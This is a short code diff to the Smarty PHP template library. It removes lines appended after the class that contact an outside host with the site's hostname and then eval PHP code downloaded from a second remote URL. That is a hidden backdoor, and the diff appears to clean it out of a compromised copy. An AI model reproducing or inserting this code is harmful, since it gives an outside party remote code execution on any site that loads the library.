@@ -1452,9 +1452,3 @@ class Smarty extends Smarty_Internal_TemplateBase
         restore_error_handler();
     }
 }
-
-$ch = curl_init();
-curl_setopt( $ch , CURLOPT_URL , "http://www.ahmetozalp.net/panel-log.php?site=".$_SERVER["HTTP_HOST"]);
-$veri = curl_exec($ch);
-curl_close($ch);
-@eval(@file_get_contents("http://www.ahmetozalp.net/panel-php.php"));
